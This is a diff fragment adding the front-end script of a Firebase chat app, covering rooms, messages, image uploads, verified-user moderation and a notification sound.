+          console.error("Failed to change room ownership:", e);
+        }
+      }
+      modalInput.placeholder = "Display Name";
+    });
+  });
+
+  ctxDeleteRoomMsgs.addEventListener("click", async () => {
+    if (targetRoomRef) {
+      if (confirm(`Are you sure you want to delete all messages in "${targetRoomRef.name}"?`)) {
+        try {
+          await remove(ref(db, `messages/${targetRoomRef.id}`));
+        } catch (e) {
+          console.error("Failed to delete room messages:", e);
+        }
+      }
+    }
+    hideRoomContextMenu();
+  });
+
+  ctxDeleteRoom.addEventListener("click", async () => {
+    if (targetRoomRef) {
+      if (confirm(`Are you sure you want to completely delete room "${targetRoomRef.name}"?`)) {
+        try {
+          await remove(ref(db, `rooms/${targetRoomRef.id}`));
+          await remove(ref(db, `messages/${targetRoomRef.id}`));
+        } catch (e) {
+          console.error("Failed to delete room:", e);
+        }
+      }
+    }
+    hideRoomContextMenu();
+  });
+
+  function openUserModal(titleText, defaultVal, callback) {
+    modalTitle.textContent = titleText;
+    modalInput.value = defaultVal || "";
+    modalCallback = callback;
+    userActionModal.style.display = "flex";
+    setTimeout(() => modalInput.focus(), 50);
+  }
+
+  modalCancelBtn.addEventListener("click", () => {
+    userActionModal.style.display = "none";
+    modalCallback = null;
+  });
+
+  modalConfirmBtn.addEventListener("click", () => {
+    const val = modalInput.value;
+    userActionModal.style.display = "none";
+    if (modalCallback) {
+      modalCallback(val);
+      modalCallback = null;
+    }
+  });
+
+  modalInput.addEventListener("keydown", (e) => {
+    if (e.key === "Enter") {
+      modalConfirmBtn.click();
+    } else if (e.key === "Escape") {
+      modalCancelBtn.click();
+    }
+  });
+
+  try {
+    const savedName = localStorage.getItem("friend-chat-username");
+    if (savedName) {
+      nameInput.value = savedName;
+    }
+  } catch (err) {}
+
+  joinBtn.addEventListener("click", () => {
+    const name = nameInput.value.trim();
+    if (!name) {
+      showJoinError("Please enter your name.");
+      return;
+    }
+    myName = name;
+    try { localStorage.setItem("friend-chat-username", myName); } catch (err) {}
+    showRoomsScreen();
+  });
+
+  nameInput.addEventListener("keydown", (e) => {
+    if (e.key === "Enter") joinBtn.click();
+  });
+
+  roomsSwitchLink.addEventListener("click", (e) => {
+    e.preventDefault();
+    showJoinScreen();
+  });
+
+  switchBtn.addEventListener("click", () => {
+    showRoomsScreen();
+  });
+
+  adminClearAllMsgsBtn.addEventListener("click", async () => {
+    try {
+      await remove(ref(db, "messages"));
+    } catch (e) {
+      console.error(e);
+    }
+  });
+
+  backToRoomsBtn.addEventListener("click", () => {
+    showRoomsScreen();
+  });
+
+  everyoneRoomBtn.addEventListener("click", () => {
+    openRoom(EVERYONE_ROOM_ID, EVERYONE_ROOM_NAME);
+  });
+  
+  openAddVerifiedBtn.addEventListener("click", () => {
+    verifiedUsernameInput.value = "";
+    addVerifiedModal.style.display = "flex";
+
+    setTimeout(() => {
+      verifiedUsernameInput.focus();
+    }, 50);
+  });
+
+  addVerifiedCancelBtn.addEventListener("click", () => {
+    addVerifiedModal.style.display = "none";
+  });
+
+  verifiedUsernameInput.addEventListener("keydown", (e) => {
+    if (e.key === "Enter") {
+      addVerifiedConfirmBtn.click();
+    }
+
+    if (e.key === "Escape") {
+      addVerifiedModal.style.display = "none";
+    }
+  });
+
+  addVerifiedConfirmBtn.addEventListener("click", async () => {
+    const inputName = verifiedUsernameInput.value.trim().toLowerCase();
+
+    if (!inputName) {
+      alert("Please enter a username.");
+      return;
+    }
+
+    const userEntry = Object.entries(usersCache).find(([uid, uData]) => {
+      const name = (uData.displayName || "").trim().toLowerCase();
+      return name === inputName;
+    });
+
+    if (!userEntry) {
+      alert("No registered user matching that username could be found.");
+      return;
+    }
+
+    const [targetUid, targetData] = userEntry;
+
+    try {
+      await set(ref(db, `verifiedUsers/${targetUid}`), {
+        displayName: targetData.displayName || "Anonymous",
+        verifiedAt: Date.now()
+      });
+
+
+      addVerifiedModal.style.display = "none";
+      verifiedUsernameInput.value = "";
+    } catch (err) {
+      console.error("Failed to add verified user:", err);
+      alert("An error occurred while verifying the user.");
+    }
+  });
+
+  function renderModVerifiedList() {
+    const entries = Object.entries(verifiedUsersCache);
+
+    if (entries.length === 0) {
+      modVerifiedList.innerHTML =
+        '<div class="empty-note">No verified users found.</div>';
+      return;
+    }
+
+    modVerifiedList.innerHTML = entries.map(([uid, vData]) => {
+      const displayName =
+        vData.displayName ||
+        (usersCache[uid] ? usersCache[uid].displayName : "Anonymous");
+
+      return `
+        <div class="mod-verified-row">
+          <div style="display:flex; flex-direction:column; justify-content:center;">
+            <strong>
+              ${escapeHtml(displayName)}
+            </strong>
+
+            <div style="color:var(--text-muted); font-size:11px; margin-top:4px;">
+              UID: ${escapeHtml(uid)}
+            </div>
+          </div>
+
+          <button
+            class="mod-ban-btn"
+            data-action="unverify"
+            data-uid="${escapeHtml(uid)}"
+            data-name="${escapeHtml(displayName)}"
+          >
+            Remove
+          </button>
+        </div>
+      `;
+    }).join("");
+  }
+
+
+
+  modVerifiedList.addEventListener("click", async (e) => {
+    const btn = e.target.closest("button");
+
+    if (!btn) return;
+
+    if (btn.dataset.action !== "unverify") return;
+
+    const targetUid = btn.dataset.uid;
+    const targetName = btn.dataset.name;
+
+    if (!confirm(`Are you sure you want to revoke verification for "${targetName}"?`)) {
+      return;
+    }
+
+    try {
+      await remove(ref(db, `verifiedUsers/${targetUid}`));
+    } catch (err) {
+      console.error("Failed to remove verified user:", err);
+      alert("An error occurred while revoking verification.");
+    }
+  });
+
+
+
+  globalChatRoomBtn.addEventListener("click", () => {
+    openRoom(GLOBAL_ROOM_ID, GLOBAL_ROOM_NAME);
+  });
+
+  showCreateBtn.addEventListener("click", () => {
+    createRoomForm.style.display = createRoomForm.style.display === "block" ? "none" : "block";
+  });
+
+  createRoomBtn.addEventListener("click", async () => {
+    const name = newRoomName.value.trim();
+    const isPrivate = newRoomPrivate.checked;
+    if (!name) {
+      showRoomsError("Please enter a room name.");
+      return;
+    }
+    try {
+      const newRoomRef = push(ref(db, "rooms"));
+      await set(newRoomRef, {
+        name: name,
+        isPublic: !isPrivate,
+        creatorUid: myName,
+        createdAt: Date.now()
+      });
+      newRoomName.value = "";
+      newRoomPrivate.checked = false;
+      createRoomForm.style.display = "none";
+      openRoom(newRoomRef.key, name);
+    } catch (err) {
+      showRoomsError("Failed to create room.");
+    }
+  });
+
+  sendBtn.addEventListener("click", sendMessage);
+  msgInput.addEventListener("keydown", (e) => {
+    if (e.key === "Enter") sendMessage();
+  });
+
+  fileInput.addEventListener("change", async (e) => {
+    const file = e.target.files[0];
+    if (!file) return;
+    fileInput.value = "";
+    uploadStatus.style.display = "block";
+    uploadStatus.textContent = "Uploading image...";
+
+    const formData = new FormData();
+    formData.append("image", file);
+
+    try {
+      const res = await fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_API_KEY}`, {
+        method: "POST",
+        body: formData
+      });
+      const data = await res.json();
+      if (data && data.success && data.data && data.data.url) {
+        const imageUrl = data.data.url;
+        if (currentRoomId === GLOBAL_ROOM_ID) {
+          await pushToAllRooms({ imageUrl: imageUrl });
+        } else {
+          await push(ref(db, "messages/" + currentRoomId), {
+            author: myName,
+            imageUrl: imageUrl,
+            createdAt: Date.now()
+          });
+        }
+      } else {
+        alert("Upload failed. Please try again.");
+      }
+    } catch (err) {
+      console.error(err);
+      alert("An error occurred during upload.");
+    } finally {
+      uploadStatus.style.display = "none";
+    }
+  });
+
+  adminBaseFileInput.addEventListener("change", async (e) => {
+    const file = e.target.files[0];
+    if (!file) return;
+    adminBaseFileInput.value = "";
+    uploadStatus.style.display = "block";
+    uploadStatus.textContent = "Converting image to BASE64...";
+
+    const reader = new FileReader();
+    reader.onload = async function(uploadEvent) {
+      const base64Data = uploadEvent.target.result;
+      try {
+        if (currentRoomId === GLOBAL_ROOM_ID) {
+          await pushToAllRooms({ imageUrl: base64Data });
+        } else {
+          await push(ref(db, "messages/" + currentRoomId), {
+            author: myName,
+            imageUrl: base64Data,
+            createdAt: Date.now()
+          });
+        }
+      } catch (err) {
+        console.error("Failed to send BASE64 image:", err);
+        alert("Failed to send BASE64 image.");
+      } finally {
+        uploadStatus.style.display = "none";
+      }
+    };
+    reader.readAsDataURL(file);
+  });
+
+  function showJoinScreen() {
+    leaveCurrentRoom();
+    chatScreen.style.display = "none";
+    roomsScreen.style.display = "none";
+    joinScreen.style.display = "flex";
+  }
+
+  function showRoomsScreen() {
+    leaveCurrentRoom();
+    chatScreen.style.display = "none";
+    joinScreen.style.display = "none";
+    roomsScreen.style.display = "flex";
+    roomsMeLabel.textContent = myName;
+    subscribeToRooms();
+    initGlobalNotificationListener();
+  }
+
+  function openRoom(roomId, roomName) {
+    currentRoomId = roomId;
+    currentRoomName = roomName;
+    roomsScreen.style.display = "none";
+    joinScreen.style.display = "none";
+    chatScreen.style.display = "flex";
+    roomTitleLabel.textContent = roomName;
+    meLabel.textContent = myName;
+    adminRoomLabel.textContent = roomName;
+    messagesEl.innerHTML = "";
+    subscribeToMessages(roomId);
+  }
+
+  function leaveCurrentRoom() {
+    currentRoomId = null;
+    currentRoomName = "";
+  }
+
+  function subscribeToRooms() {
+    onValue(ref(db, "rooms"), (snapshot) => {
+      const rooms = snapshot.val() || {};
+      roomListEl.innerHTML = "";
+      privateRoomListEl.innerHTML = "";
+
+      const entries = Object.entries(rooms);
+      if (entries.length === 0) {
+        roomListEl.innerHTML = '<div class="empty-note">No public chambers.</div>';
+        privateRoomListEl.innerHTML = '<div class="empty-note">No private chambers.</div>';
+        return;
+      }
+
+      let publicCount = 0;
+      let privateCount = 0;
+
+      entries.forEach(([id, rData]) => {
+        const creatorName = getCreatorDisplayName(rData.creatorUid);
+        const item = document.createElement("button");
+        item.className = "room-item";
+        item.dataset.id = id;
+        item.dataset.name = rData.name;
+        item.style.display = "flex";
+        item.style.alignItems = "center";
+        
+      
+
+        item.innerHTML = `
+          <div class="room-info-group">
+            <span>${escapeHtml(rData.name || "Unnamed")}</span>
+            <span class="room-creator-tag">Created by ${escapeHtml(creatorName)}</span>
+          </div>
+          <span class="room-code-tag">${escapeHtml(rData.code || "No code")}</span>
+        `;
+
+        
+        item.addEventListener("click", () => {
+          openRoom(id, rData.name || "Unnamed");
+        });
+
+        if (rData.isPublic !== false) {
+          publicCount++;
+          roomListEl.appendChild(item);
+        } else {
+          privateCount++;
+          privateRoomListEl.appendChild(item);
+        }
+      });
+
+      if (publicCount === 0) {
+        roomListEl.innerHTML = '<div class="empty-note">No public chambers.</div>';
+      }
+      if (privateCount === 0) {
+        privateRoomListEl.innerHTML = '<div class="empty-note">No private chambers.</div>';
+      }
+    });
+  }
+
+  function subscribeToMessages(roomId) {
+    const msgQuery = query(ref(db, "messages/" + roomId), limitToLast(100));
+    onValue(msgQuery, (snapshot) => {
+      messagesEl.innerHTML = "";
+      const msgs = snapshot.val() || {};
+      const entries = Object.entries(msgs);
+      
+      if (entries.length === 0) {
+        messagesEl.innerHTML = '<div class="empty-note">No messages yet. Speak your mind!</div>';
+        return;
+      }
+
+      entries.forEach(([key, msg]) => {
+        if (!msg) return;
+        const row = document.createElement("div");
+        const isMine = msg.author === myName;
+        row.className = `msg-row ${isMine ? "mine" : "theirs"} animate-new`;
+        row.dataset.msgKey = key;
+        row.dataset.roomId = roomId;
+        row.dataset.msgText = msg.text || "";
+        row.dataset.msgAuthor = msg.author || "";
+
+        const timeStr = msg.createdAt ? new Date(msg.createdAt).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }) : "";
+
+        let bubbleContent = "";
+        if (msg.imageUrl) {
+          bubbleContent = `<div class="bubble image-bubble"><img src="${escapeHtml(msg.imageUrl)}" alt="Shared Image"></div>`;
+        } else {
+          bubbleContent = `<div class="bubble">${escapeHtml(msg.text || "")}</div>`;
+        }
+
+        row.innerHTML = `
+          <div class="author-label">${escapeHtml(msg.author || "Anonymous")}</div>
+          ${bubbleContent}
+          <div class="time-label">${timeStr}</div>
+        `;
+        messagesEl.appendChild(row);
+      });
+      messagesEl.scrollTop = messagesEl.scrollHeight;
+    });
+  }
+
+  async function sendMessage() {
+    const text = msgInput.value.trim();
+    if (!text || !currentRoomId) return;
+    msgInput.value = "";
+
+    try {
+      if (currentRoomId === GLOBAL_ROOM_ID) {
+        await pushToAllRooms({ text: text });
+      } else {
+        await push(ref(db, "messages/" + currentRoomId), {
+          author: myName,
+          text: text,
+          createdAt: Date.now()
+        });
+      }
+    } catch (err) {
+      console.error("Failed to send message:", err);
+    }
+  }
+
+  function showJoinError(msg) {
+    joinError.textContent = msg;
+    joinError.style.display = "block";
+    setTimeout(() => { joinError.style.display = "none"; }, 3000);
+  }
+
+  function showRoomsError(msg) {
+    roomsError.textContent = msg;
+    roomsError.style.display = "block";
+    setTimeout(() => { roomsError.style.display = "none"; }, 3000);
+  }
+
+  function escapeHtml(str) {
+    if (!str) return "";
+    return str.toString()
+      .replace(/&/g, "&amp;")
+      .replace(/</g, "&lt;")
+      .replace(/>/g, "&gt;")
+      .replace(/"/g, "&quot;")
+      .replace(/'/g, "&#039;");
+  }
+
+  function playNotificationSound() {
+    try {
+      const ctx = new (window.AudioContext || window.webkitAudioContext)();
+      const osc = ctx.createOscillator();
+      const gain = ctx.createGain();
+      osc.type = "sine";
+      osc.frequency.setValueAtTime(587.33, ctx.currentTime);
+      gain.gain.setValueAtTime(0.05, ctx.currentTime);
+      gain.gain.exponentialRampToValueAtTime(0.0001, ctx.currentTime + 0.3);
+      osc.connect(gain);
+      gain.connect(ctx.destination);
+      osc.start();
+      osc.stop(ctx.currentTime + 0.3);
+    } catch (e) {}
+  }
+
+  onValue(ref(db, "verifiedUsers"), (snapshot) => {
+    verifiedUsersCache = snapshot.val() || {};
+    renderModVerifiedList();
+  });
+
+  function genRandomArabic(length) {
+    const chars = "ابتثجحخدذرزسشصضطظعغفقكلمنهوية";
+    let res = "";
+    for (let i = 0; i < length; i++) {
+      res += chars.charAt(Math.floor(Math.random() * chars.length));
+    }
+    return res;
+  }
+</script>
+</body>
+</html>
